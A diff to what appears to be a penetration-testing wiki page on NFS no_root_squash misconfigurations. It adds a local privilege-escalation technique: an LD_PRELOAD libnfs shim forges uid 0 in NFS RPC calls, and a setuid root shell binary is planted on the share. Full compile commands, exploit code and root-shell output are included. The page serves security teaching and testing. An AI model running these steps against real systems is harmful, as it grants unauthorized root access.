@@ -8,6 +8,8 @@ Read the _**/etc/exports**_ file, if you find some directory that is configured 
 
 ## Privilege Escalation
 
+### Remote Exploit
+
 If you have found this vulnerability, you can exploit it:
 
 * **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
@@ -41,5 +43,63 @@ cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
 
+### Local Exploit
 
+{% hint style="info" %}
+Note that if you can create a tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports.
+{% endhint %}
+
+**Trick copied from** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs_privesc.html)\*\*\*\*
+
+Now, let’s assume that the share server still runs `no_root_squash` but there is something preventing us from mounting the share on our pentest machine. This would happen if the `/etc/exports` has an explicit list of IP addresses allowed to mount the share.
+
+Listing the shares now shows that only the machine we’re trying to privesc on is allowed to mount it:
+
+```text
+[root@pentest]# showmount -e nfs-server
+Export list for nfs-server:
+/nfs_root   machine
+```
+
+This means that we’re stuck exploiting the mounted share on the machine locally from an unprivileged user. But it just so happens that there is another, lesser known local exploit.
+
+This exploit relies on a problem in the NFSv3 specification that mandates that it’s up to the client to advertise its uid/gid when accessing the share. Thus it’s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!
+
+Here’s a [library that lets you do just that](https://github.com/sahlberg/libnfs).
+
+#### Compiling the example <a id="compiling-the-example"></a>
+
+Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscall. Due to the absence of cmake on the system, I also needed to link against the precompiled library which can be [found here](https://sites.google.com/site/libnfstarballs/li).
+
+```bash
+gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L../libnfs-1.11.0/lib/.libs/
+```
+
+#### Exploiting using the library <a id="exploiting-using-the-library"></a>
+
+Let’s use the simplest of exploits:
+
+```bash
+cat pwn.c
+int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
+gcc pwn.c -o a.out
+```
+
+Place our exploit on the share and make it suid root by faking our uid in the RPC calls:
+
+```text
+LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+```
+
+All that’s left is to launch it:
+
+```text
+[w3user@machine libnfs]$ /mnt/share/a.out
+[root@machine libnfs]#
+```
+
+There we are, local root privilege escalation!
 
